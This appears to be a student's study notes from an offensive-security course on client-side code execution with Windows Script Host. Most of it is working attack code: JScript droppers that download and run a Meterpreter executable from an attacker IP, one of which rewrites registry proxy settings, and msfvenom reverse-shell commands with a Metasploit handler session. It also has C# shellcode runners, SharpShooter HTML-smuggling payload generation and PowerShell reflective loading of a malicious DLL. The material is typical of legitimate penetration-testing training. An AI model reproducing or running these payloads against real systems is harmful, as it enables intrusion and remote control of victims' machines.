### Jscript on Windows 10
- Javascript attachments as alternative to Office VBA macros
- phishing attacks
- executing jscript outside a browser bypasses security settings

##### JS Script to open calc.exe
```js
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("calc.exe");
```

#### VBScript to open calc.exe
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "calc.exe"
Set objShell = Nothing
```

### JScript Meterpreter Dropper

- _MSXML2.XMLHTTP_ object, which is based on the Microsoft XML Core Services, and its associated HTTP protocol parser. This object provides client-side protocol support to communicate with HTTP servers. Although it is not documented, it is present in all modern versions of Windows.
- To summarize our code, we'll use the (_url_) variable to set the URL of the Meterpreter executable. Then we'll create a Windows Script _MSXML2.XMLHTTP_ object and call the _Open_ method on that object to specify a GET request along with the URL. Finally, we'll send the GET request to download the file.
- met.exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f exe -o met.exe
```
```Jscript
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

- start webserver on kali host `python3 -m http.server 80`
- met.js
```javascript
var url = "http://192.168.1.110/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

- start metasploit on kali
- metasploit commands
```shell
usemsf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > set lhost eth0
lhost => 192.168.1.110
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.110    yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set EXITFUNC thread
EXITFUNC => thread
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.1.110:443
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Staging x64 payload (202844 bytes) ...
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.110:443 -> 192.168.1.135:52618) at 2024-05-11 14:15:46 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: COMMANDO\dooley
```

- If we needed to set a proxy `oSrvXMLHTTPRequest.setProxy(proxySetting, varProxyServer, varBypassList);`
- MS Doc https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236(v=vs.85)?redirectedfrom=MSDN
- https://learn.microsoft.com/en-us/sql/ado/guide/data/command-streams?view=sql-server-ver16
- ADO stands for ActiveX Data Objects.  The ADO Stream Object is used to read, write, and manage a stream of binary or text data.

### JScript and Proxies

- download file
```js
var proxyServer = "http://192.168.250.12:3128"; // Your Squid proxy server
var url = "http://192.168.45.219/met.exe"; // URL to download the file from
var destination = "C:\\Windows\\Tasks\\met.exe"; // Destination path to save the file

// Set system proxy settings for the script
function setSystemProxy(proxyServer) {
    try {
        var WshShell = new ActiveXObject("WScript.Shell");
        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable", 1, "REG_DWORD");
        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer", proxyServer, "REG_SZ");
    } catch (e) {
        WScript.Echo("Failed to set proxy settings: " + e.message);
    }
}

// Function to download a file using XMLHttpRequest
function downloadFile(url, destination) {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // adTypeBinary
            stream.Write(xhr.responseBody);
            stream.Position = 0;

            var fso = new ActiveXObject("Scripting.FileSystemObject");
            if (fso.FileExists(destination)) {
                fso.DeleteFile(destination);
            }

            stream.SaveToFile(destination, 2); // adSaveCreateOverWrite
            stream.Close();
            WScript.Echo("File downloaded successfully to " + destination);
        } else {
            WScript.Echo("Failed to download file. HTTP status: " + xhr.status);
        }
    } catch (e) {
        WScript.Echo("Error: " + e.message);
    }
}

// Set the system proxy and download the file
setSystemProxy(proxyServer);
downloadFile(url, destination);

```
- to run from shell `cscript .\file.js`


## JScript and C\#

- run in memory rather than touching disk
- needed to rebuild DotNetToJscript dll due to the following error
```cmd
c:\Users\dooley\Documents\github\DotNetToJScript>DotNetToJScript\bin\Debug\DotNetToJScript.exe ExampleAssembly\bin\Debug\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
This tool should only be run on v2 of the CLR
```
- solution to issue https://github.com/tyranid/DotNetToJScript/issues/19
- code to launch command prompt
```c#
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]

public class TestClass

{

    public TestClass()

    {
        // Create a new ProcessStartInfo object

        ProcessStartInfo psi = new ProcessStartInfo

        {

            FileName = "cmd.exe", // Specify the executable to run (cmd.exe)
            UseShellExecute = true // Use the shell to execute the process

        };

        // Start the process

        Process.Start(psi);

    }

    public void RunProcess(string path)

    {

        Process.Start(path);

    }

}
```

- When calling Win32 APIs from PowerShell (in the previous module), we demonstrated the straightforward _Add-Type_ method and the more complicated reflection technique. However, the complexity of reflection was well worth it as we avoided writing C# source code and compiled assembly files temporarily to disk during execution. Luckily, when dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem.

## Shellcode Runner in C\#

- A signaled state indicates a resource is available for a process or thread to use it. A not-signaled state indicates the resource is in use.
- import Win32 APIs to execute shellcode in memory
```c#
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, 
    uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

#### Example code 64-bit

- set CPU arch to x64
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

- buf
```bash 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
...

```


### SharpShooter

- python2 compliant one
- python3 fork https://github.com/SYANiDE-/SuperSharpShooter
	- needed to change requirements to `jsmin==3.0.0`
	- virtenv in ~/virtual-environments/supersharpshooter
- generate payload
```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f raw -o shell.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 622 bytes
Saved as: shell.txt
```
- convert to js 
```bash
❯ sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --output  test

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Shar'+'p'+'Sh'+'o'+'o'+'ter';
[*] Written delivery payload to output/test.js

```

### Smuggling 

```bash
sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --smuggle --template mcafee --output smuggle

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Sh'+'arp'+'Sho'+'ot'+'e'+'r';
[*] Written delivery payload to output/smuggle.js
[*] File [./output/smuggle.js] successfully loaded !  (will be smuggled in .html)
[*] Encrypted input file with key [haibrysxozefqzekgctaqwgcydmijpsr]
[*] File [./output/smuggle.html] successfully created !  
          ^^ Selected delivery method

```


## Reflective Load (Powershell)

- create project Class Library (.Net Framework)
- creating malicious dll

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1

{
    public class Class1

    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,

          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    public static void runner()

    {

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp

            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,                           ...                                  0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
                                                        0xd5};


            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

    }

}
```
- interact with powershell to get meterpreter staged payload
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.110/ClassLibrary1.dll', '<insert path>\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("<insert path>\ClassLibrary1.dll")

PS> $class = $assem.GetType("ClassLibrary1.Class1")

$method = $class.GetMethod("runner")

$method.Invoke(0, $null)
```
- Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the _Load_[1](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-1) method, which accepts a _Byte_ array in memory instead of a disk file. In this case, we'll modify our PowerShell code to use the _DownloadData_[2](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-2) method of the _Net.WebClient_ class to download the DLL as a byte array.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.110/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## TO DO:
- Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.
